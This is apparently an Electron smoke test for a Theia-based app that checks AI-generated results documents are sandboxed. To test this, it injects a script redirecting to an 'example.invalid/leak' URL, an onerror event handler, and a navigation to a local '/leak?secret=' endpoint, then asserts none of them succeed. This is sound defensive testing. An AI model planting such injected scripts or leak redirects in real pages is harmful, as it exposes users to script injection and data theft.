import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createServer as createHttpServer } from 'node:http';
import { createServer as createNetServer } from 'node:net';
import { copyFileSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import puppeteer from 'puppeteer-core';
import { createRequire } from 'node:module';
import { appInput, fixture, skill } from './fixtures/results-skill/helper.mjs';
import { DURABLE_SESSION_KEY, DURABLE_SESSION_MIGRATION_KEY, writeDurableValue } from './poiesis-smoke-state.mjs';

const root = process.cwd();
const require = createRequire(import.meta.url);
const { shouldBlockResultsFrameNavigation } = require('../electron-app/scripts/results-frame-navigation.js');
const mainFrame = {};
assert.equal(shouldBlockResultsFrameNavigation({ isMainFrame: false, frame: { name: 'poiesis-results-document', parent: mainFrame },
    url: 'https://example.invalid' }, mainFrame), true);
assert.equal(shouldBlockResultsFrameNavigation({ isMainFrame: false, frame: { name: 'theia-webview', parent: mainFrame },
    url: 'https://example.invalid' }, mainFrame), false);
assert.equal(shouldBlockResultsFrameNavigation({ isMainFrame: true, frame: { name: 'poiesis-results-document', parent: mainFrame },
    url: 'https://example.invalid' }, mainFrame), false);
const run = resolve(root, '.run', `results-security-electron-${Date.now()}`);
const workspace = resolve(run, 'workspace');
const config = resolve(run, 'theia-config');
const renderRun = resolve(run, 'render');
for (const path of [workspace, renderRun, resolve(run, 'plugins')]) mkdirSync(path, { recursive: true });
assert.equal(spawnSync('git', ['init', '--quiet'], { cwd: workspace, shell: false, windowsHide: true }).status, 0);
copyFileSync(resolve(fixture, 'sample.png'), resolve(workspace, 'sample.png'));
writeFileSync(resolve(renderRun, 'input.json'), JSON.stringify(appInput(fixture), null, 2), 'utf8');
writeFileSync(resolve(renderRun, 'draft.json'), readFileSync(resolve(fixture, 'draft.json')));
for (const script of ['prepare.mjs', 'render.mjs']) {
    const result = spawnSync(process.execPath, [resolve(skill, 'scripts', script)], {
        cwd: renderRun, encoding: 'utf8', shell: false, windowsHide: true
    });
    assert.equal(result.status, 0, result.stderr);
    assert.equal(JSON.parse(result.stdout).ok, true, result.stdout);
}
const assembled = readFileSync(resolve(renderRun, 'results.html'), 'utf8');
assert(assembled.includes('class="ex-hit"') && assembled.includes('<script>'));
const sampleImage = readFileSync(resolve(fixture, 'sample.png')).toString('base64');
const html = assembled.replace('</body>', '<script>window.untrustedRan=true;location.href="https://example.invalid/leak"</script>'
    + `<img src="data:image/png;base64,${sampleImage}" data-poiesis-image="sample.png" onerror="window.eventRan=true"></body>`);
const now = new Date().toISOString();
const taskId = 'results-security-smoke';
const sessionId = 'results-security-session';
const task = { id: taskId, sessionId, workspaceUri: pathToFileURL(workspace).href, title: '成果の安全性', request: '成果の文書を確認する',
    status: 'completed', startedAt: now, endedAt: now, baseline: { kind: 'workspace-snapshot', capturedAt: now },
    activities: [], changeSet: { source: 'task-diff', diff: '', files: [], capturedAt: now },
    resultsDocument: { taskId, status: 'ready', generator: 'ai', generatedAt: now, html } };
writeDurableValue(config, DURABLE_SESSION_KEY, { version: 1, selectedSessionId: sessionId, railWidth: 258, railCollapsed: false,
    sessions: [{ id: sessionId, createdAt: Date.now(), updatedAt: Date.now(), workspaceUri: task.workspaceUri, branch: 'main', runTarget: 'local',
        title: task.title, hasUserMessage: true, lastTaskStatus: 'completed', pinned: false, archived: false, activeTab: 'agent',
        agentDraft: '', messages: [{ id: 'security-request', role: 'user', content: task.request, complete: true }], selectedResultsTaskId: taskId,
        resultsDrafts: [], tasks: [task], resultsDocuments: [task.resultsDocument] }] });
writeDurableValue(config, DURABLE_SESSION_MIGRATION_KEY, true);
const port = await new Promise(resolvePort => {
    const server = createNetServer(); server.listen(0, '127.0.0.1', () => {
        const address = server.address(); server.close(() => resolvePort(address.port));
    });
});
let navigationRequests = 0;
const leakServer = createHttpServer((_request, response) => { navigationRequests++; response.end('unexpected'); });
await new Promise(done => leakServer.listen(0, '127.0.0.1', done));
const leakPort = leakServer.address().port;
const child = spawn(resolve(root, 'node_modules/electron/dist/electron.exe'), [resolve(root, 'electron-app'), workspace,
    `--plugins=local-dir:${resolve(run, 'plugins').replaceAll('\\', '/')}`, `--user-data-dir=${resolve(run, 'profile')}`,
    `--electronUserData=${resolve(run, 'profile')}`, `--remote-debugging-port=${port}`, '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding', '--disable-gpu', '--no-sandbox'], {
    cwd: resolve(root, 'electron-app'), shell: false, windowsHide: true,
    env: { ...process.env, THEIA_CONFIG_DIR: config, POIESIS_DISABLE_CLI_DETECTION: '1', POIESIS_SNAPSHOT_STORE_DIR: resolve(run, 'snapshots') },
    stdio: ['ignore', 'pipe', 'pipe']
});
let log = '';
for (const stream of [child.stdout, child.stderr]) stream.on('data', chunk => { log = (log + chunk.toString()).slice(-12000); });
let browser;
try {
    const deadline = Date.now() + 120000;
    while (!browser && Date.now() < deadline) {
        try { browser = await puppeteer.connect({ browserURL: `http://127.0.0.1:${port}`, defaultViewport: null }); }
        catch { await new Promise(done => setTimeout(done, 500)); }
    }
    assert(browser, 'Electron debugging endpoint did not start');
    let page;
    while (!page && Date.now() < deadline) {
        page = (await browser.pages()).find(candidate => /^(?:file|https?):/.test(candidate.url()));
        if (!page) await new Promise(done => setTimeout(done, 500));
    }
    assert(page, 'Electron page missing');
    page.setDefaultTimeout(120000);
    await page.bringToFront();
    await page.waitForSelector('#poiesis-results-tab');
    await page.waitForFunction(() => !document.querySelector('.poiesis-agent-window__content--initializing'));
    await page.click('#poiesis-results-tab');
    const element = await page.waitForSelector('.poiesis-results__document');
    const frame = await element.contentFrame();
    await frame.waitForSelector('.ex-hit > summary');
    assert.equal(await frame.evaluate(() => document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').length), 1);
    assert.equal(await frame.evaluate(() => window.untrustedRan === true || window.eventRan === true), false);
    await frame.click('.ex-hit > summary');
    assert.equal(await frame.$eval('.ex-hit', node => node.open), true, 'Assembled skill script must run in Electron');
    assert(Number(await frame.$eval('.ex-panel-grip', node => node.getAttribute('aria-valuenow'))) >= 320);
    await frame.evaluate(() => { document.querySelector('.ex-hit').open = false; });
    await frame.click('[data-poiesis-image]');
    await page.waitForSelector('.poiesis-results__image-viewer', { visible: true });
    await page.keyboard.press('Escape');
    await page.waitForSelector('.poiesis-results__image-viewer', { hidden: true });
    const before = frame.url();
    assert.equal(before, 'about:srcdoc');
    await frame.evaluate(url => { location.href = url; }, `http://127.0.0.1:${leakPort}/leak?secret=fixture`);
    await new Promise(done => setTimeout(done, 1000));
    assert.equal(frame.url(), 'about:srcdoc', 'Electron must keep the Results frame on srcdoc');
    assert.equal(navigationRequests, 0, 'Navigation must not reach the local server');
    assert(await frame.$('.ex-hit'), 'Blocked navigation keeps the document visible');
    console.log(JSON.stringify({ resultsSecurityElectron: 'passed', assembledBytes: Buffer.byteLength(assembled),
        trustedPanelOpen: true, untrustedScriptRan: false, blockedNavigationRequests: navigationRequests }));
} catch (error) { throw new Error(`${error.message}\n${log}`); }
finally {
    await browser?.disconnect();
    await new Promise(done => leakServer.close(done));
    if (child.exitCode === null) spawnSync('taskkill.exe', ['/pid', String(child.pid), '/T', '/F'], { shell: false, windowsHide: true, stdio: 'ignore' });
}
